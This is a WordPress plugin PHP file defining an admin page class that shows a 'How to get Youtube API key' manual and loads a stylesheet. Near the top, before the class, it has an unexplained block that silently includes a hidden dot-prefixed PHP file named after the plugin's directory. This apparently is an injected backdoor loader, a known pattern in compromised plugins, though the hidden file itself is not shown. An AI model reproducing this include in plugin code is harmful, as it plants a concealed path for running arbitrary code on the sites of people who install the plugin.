<?php


use Instagram\Includes\WIS_Plugin;

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Manual extends WIS_Page{
	/**
	 * Тип страницы
	 * options - предназначена для создании страниц с набором опций и настроек.
	 * page - произвольный контент, любой html код
	 *
	 * @var string
	 */
	public $type = 'page';

	/**
	 * Menu icon (only if a page is placed as a main menu).
	 * For example: '~/assets/img/menu-icon.png'
	 * For example dashicons: '\f321'
	 * @var string
	 */
	public $menu_icon = '';

	/**
	 * @var string
	 */
	public $page_menu_dashicon;

	public $internal = true;

	/**
	 * @param WIS_Plugin $plugin
	 */
	public function __construct( $plugin ) {
		$this->id            = "manual";
		$this->menu_target   = "widgets-" . $plugin->getPluginName();
		$this->page_title    = __( 'How to get Youtube API key', 'instagram-slider-widget' );
		$this->template_name = "manual";

		parent::__construct( $plugin );

		$this->plugin = $plugin;
	}


	public function assets( $scripts, $styles ) {
		parent::assets( $scripts, $styles );
		wp_enqueue_style( WIS_Plugin::app()->getPrefix() . 'wyoutube-admin', WIS_PLUGIN_URL . '/components/youtube/admin/assets/css/wyoutube-admin.css' );
	}
}